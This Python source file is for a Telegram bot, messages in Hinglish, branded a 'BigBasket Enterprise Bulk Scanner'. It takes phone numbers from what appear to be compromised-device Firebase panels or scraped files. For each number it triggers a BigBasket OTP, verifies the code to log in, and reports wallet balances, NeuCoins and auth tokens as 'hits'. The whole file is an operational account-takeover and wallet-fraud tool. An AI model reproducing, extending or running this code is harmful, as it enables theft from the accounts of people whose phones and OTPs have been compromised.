@bot.message_handler(func=lambda m: m.text == "🌐 Direct Firebase Panel Scan")
@bot.message_handler(commands=["panel"])
def handle_panel_command(message):
    chat_id = message.chat.id
    parts = message.text.split(maxsplit=1)

    if len(parts) > 1:
        do_panel_scan(chat_id, parts[1].strip())
    else:
        with session_lock:
            user_sessions[chat_id] = {"state": "AWAITING_PANEL"}
        safe_send(
            chat_id,
            "🌐 <b>Firebase Panel URL ya Name bhejein:</b>\n\n"
            "Examples:\n"
            "• <code>pani-1da70</code>\n"
            "• <code>https://pani-1da70-default-rtdb.firebaseio.com</code>\n\n"
            "Bot panel se live online devices ke <b>Slot 1 & Slot 2 physical numbers</b> nikal kar scan start karega!",
            reply_markup=cancel_keyboard()
        )

# ============ MANUAL SINGLE NUMBER CHECK ============
@bot.message_handler(func=lambda m: m.text == "📱 Check Single Number")
def prompt_single_number(message):
    chat_id = message.chat.id
    with session_lock:
        user_sessions[chat_id] = {"state": "AWAITING_NUMBER"}
    safe_send(
        chat_id,
        "📲 <b>Kripya 10-digit Indian Mobile Number enter karein:</b>\n(e.g. <code>9899123456</code>)",
        reply_markup=cancel_keyboard()
    )

@bot.message_handler(func=lambda m: m.text == "📁 Upload Scraped File")
def prompt_file_upload(message):
    safe_send(
        message.chat.id,
        "📁 <b>Scraped File Upload Guide:</b>\n\n"
        "1. Apne Red Glass Dashboard se <code>clean_numbers_*.txt</code>, <code>all_panels_*.txt</code> ya <code>.csv</code> download karein.\n"
        "2. Use direct chat me <b>Document format me send karein</b>.\n"
        "3. Bot auto har number ke sath uski <b>Device ID & Panel</b> match karke scan chala dega!",
        reply_markup=main_keyboard()
    )

@bot.message_handler(commands=["cancel"])
@bot.message_handler(func=lambda m: m.text in ["❌ Cancel", "❌ Cancel Session"])
def handle_cancel(message):
    chat_id = message.chat.id
    with session_lock:
        if chat_id in user_sessions:
            del user_sessions[chat_id]
            safe_send(chat_id, "✅ Session cancelled.", reply_markup=main_keyboard())
        else:
            safe_send(chat_id, "ℹ️ Koi active session nahi tha.", reply_markup=main_keyboard())

@bot.message_handler(commands=["check"])
def handle_check_command(message):
    chat_id = message.chat.id
    parts = message.text.split()
    if len(parts) > 1:
        start_single_flow(chat_id, parts[1].strip())
    else:
        with session_lock:
            user_sessions[chat_id] = {"state": "AWAITING_NUMBER"}
        safe_send(
            chat_id,
            "📲 <b>Mobile number enter karein:</b>\nUsage: <code>/check 9899123456</code> ya seedha number bhejein.",
            reply_markup=cancel_keyboard()
        )

def start_single_flow(chat_id: int, raw_number: str):
    phone = normalize_phone(raw_number)
    if not phone:
        safe_send(chat_id, "❌ <b>Invalid Mobile Number!</b> 10-digit number enter karein.", reply_markup=main_keyboard())
        return

    safe_send(chat_id, f"🔄 <b>Connecting to BigBasket...</b>\nSending OTP to <code>+91 {esc(phone)}</code>...", reply_markup=cancel_keyboard())

    def do_send():
        bb = BigBasketClient()
        ok_send, ref_or_err = bb.send_otp(phone)
        if not ok_send:
            safe_send(chat_id, f"❌ <b>OTP Send Failed:</b> {esc(ref_or_err)}", reply_markup=main_keyboard())
            with session_lock:
                user_sessions.pop(chat_id, None)
            return

        with session_lock:
            user_sessions[chat_id] = {
                "state": "AWAITING_OTP",
                "phone": phone,
                "ref_id": ref_or_err,
                "client": bb,
                "sent_time": time.time()
            }

        safe_send(
            chat_id,
            f"✅ <b>OTP Sent Successfully!</b>\n\n"
            f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
            f"🔑 <b>Ref ID:</b> <code>{esc(ref_or_err)}</code>\n\n"
            f"👉 Kripya 6-digit OTP reply me bhejein (Valid for 3 mins):",
            reply_markup=cancel_keyboard()
        )

    threading.Thread(target=do_send, daemon=True).start()

# ============ TEXT / INPUT ROUTER ============
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    chat_id = message.chat.id
    text = (message.text or "").strip()

    with session_lock:
        session = user_sessions.get(chat_id)

    # 1. Awaiting Panel Name/URL
    if session and session.get("state") == "AWAITING_PANEL":
        with session_lock:
            user_sessions.pop(chat_id, None)
        do_panel_scan(chat_id, text)
        return

    # 2. Awaiting Manual Number
    if session and session.get("state") == "AWAITING_NUMBER":
        start_single_flow(chat_id, text)
        return

    # 3. Awaiting Manual OTP
    if session and session.get("state") == "AWAITING_OTP":
        otp = re.sub(r"[^\d]", "", text)
        if len(otp) not in (4, 6):
            safe_send(chat_id, "❌ Kripya valid 4 ya 6-digit OTP enter karein:", reply_markup=cancel_keyboard())
            return

        phone = session["phone"]
        ref_id = session["ref_id"]
        bb: BigBasketClient = session["client"]

        safe_send(chat_id, f"🔄 Verifying OTP <code>{esc(otp)}</code> for <code>+91 {esc(phone)}</code>...")

        def do_verify():
            ok_v, token_or_err, auth_d = bb.verify(phone, otp, ref_id)
            if not ok_v:
                safe_send(chat_id, f"❌ <b>Login Failed:</b> {esc(token_or_err)}\nDobara koshish karein ya /cancel karein.", reply_markup=cancel_keyboard())
                return

            w = bb.wallet()
            tb = w.get("total_balance", 0.0) if w else 0.0
            cb = w.get("current_wallet_balance", 0.0) if w else 0.0
            coins = w.get("neucoins", 0) if w else 0
            name = w.get("name") if w and w.get("name") else "BigBasket User"
            ts = datetime.now().strftime("%d-%m-%Y %H:%M:%S")

            if tb > 0 or cb > 0 or coins > 0:
                card = (
                    f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
                    f"👤 <b>Customer:</b> <b>{esc(name)}</b>\n"
                    f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
                    f"🆓 <b>Free Usable Cash:</b> <b>₹{cb:.2f}</b>\n"
                    f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
                    f"🔑 <b>Auth Token:</b> <code>{esc(bb.token[:25])}...</code>\n"
                    f"🕒 <b>Time:</b> <code>{ts}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                )
            else:
                card = (
                    f"✅ <b>Login OK</b> for <code>+91 {esc(phone)}</code> ({esc(name)})\n"
                    f"💰 Total Balance: ₹0.00 | Free Cash: ₹0.00 | NeuCoins: 0"
                )

            with session_lock:
                user_sessions.pop(chat_id, None)

            safe_send(chat_id, card, reply_markup=main_keyboard())

        threading.Thread(target=do_verify, daemon=True).start()
        return

    # 4. Direct Paste of Firebase URL
    if "firebaseio.com" in text or "firebasedatabase.app" in text:
        m_urls = re.findall(r"https?://[^\s/$.?#].[^\s]*", text)
        if m_urls:
            added = 0
            with cfg_lock:
                if chat_id not in user_panels:
                    user_panels[chat_id] = []
                for u in m_urls:
                    if u not in user_panels[chat_id]:
                        user_panels[chat_id].append(u)
                        added += 1
                if added > 0:
                    save_configs()
            
            p_to_scan = m_urls[0]
            markup = types.InlineKeyboardMarkup()
            if len(m_urls) > 1:
                markup.add(types.InlineKeyboardButton(f"🌐 Scan All {len(m_urls)} Panels Now", callback_data="scan_all_panels"))
            markup.add(
                types.InlineKeyboardButton(f"🚀 Scan {p_to_scan[:20]}...", callback_data=f"scan_panel_{p_to_scan}"),
                types.InlineKeyboardButton("⚙️ Open Panel Manager", callback_data="ping_panels")
            )
            safe_send(
                chat_id,
                f"📥 <b>{len(m_urls)} Firebase URL(s) detected & saved!</b>\n"
                f"Click below to scan immediately:",
                reply_markup=markup
            )
            return

    # 5. Direct number input fallback
    norm = normalize_phone(text)
    if norm:
        start_single_flow(chat_id, norm)
        return

    # 6. Default menu prompt
    safe_send(
        chat_id,
        "ℹ️ <b>10-digit Mobile Number enter karein</b>, <b>Panel URL paste karein</b>, ya <b>Scraped File</b> upload karein:",
        reply_markup=main_keyboard()
    )

def check_interrupted_scans_on_boot():
    time.sleep(2)
    if not os.path.exists(STATE_DIR):
        return
    for fname in os.listdir(STATE_DIR):
        if fname.startswith("scan_state_") and fname.endswith(".json"):
            try:
                cid = int(fname.replace("scan_state_", "").replace(".json", ""))
                saved = get_saved_scan_state(cid)
                if saved:
                    proc_cnt = len(saved.get("processed_phones", []))
                    tot_cnt = saved.get("total", len(saved.get("targets", [])))
                    rem_cnt = tot_cnt - proc_cnt
                    if rem_cnt > 0:
                        markup = types.InlineKeyboardMarkup()
                        markup.row(
                            types.InlineKeyboardButton(f"▶️ Resume Scan ({rem_cnt} Left)", callback_data="resume_saved_scan"),
                            types.InlineKeyboardButton("🗑️ Discard & Reset", callback_data="discard_saved_scan")
                        )
                        safe_send(
                            cid,
                            f"🔄 <b>Bot Restarted / Back Online!</b>\n\n"
                            f"⚠️ Pichla scan <code>{esc(saved.get('scan_title', 'Scan'))}</code> server restart ke karan pause ho gaya tha.\n"
                            f"📊 Progress: <code>{proc_cnt}/{tot_cnt}</code> SIMs checked ({rem_cnt} remaining)\n"
                            f"🔥 Hits so far: <b>{len(saved.get('hits', []))}</b>\n\n"
                            f"Scan ko wahi se aage badhane ke liye <b>Resume Scan</b> dabayein:",
                            reply_markup=markup
                        )
            except Exception:
                pass

def start_bot():
    start_render_health_server()
    start_render_self_ping()
    threading.Thread(target=check_interrupted_scans_on_boot, daemon=True).start()
    print(f"""
  ╔═════════════════════════════════════════════════════════════════════╗
  ║    BIGBASKET ENTERPRISE BULK SCANNER BOT RUNNING                    ║
  ║    Bot: @mangerbot2423bot                                           ║
  ║    Engine: 5 Concurrent Workers | Multi-Panel Manager | Auto-DM     ║
  ║    Render 24/7 Keep-Alive: Port {os.environ.get('PORT', '8080')} Active               ║
  ║    Auto-Recovery: Active Scan State Persistence Enabled             ║
  ╚═════════════════════════════════════════════════════════════════════╝
    """)
    bot.infinity_polling(timeout=20, long_polling_timeout=15)

if __name__ == "__main__":
    start_bot()

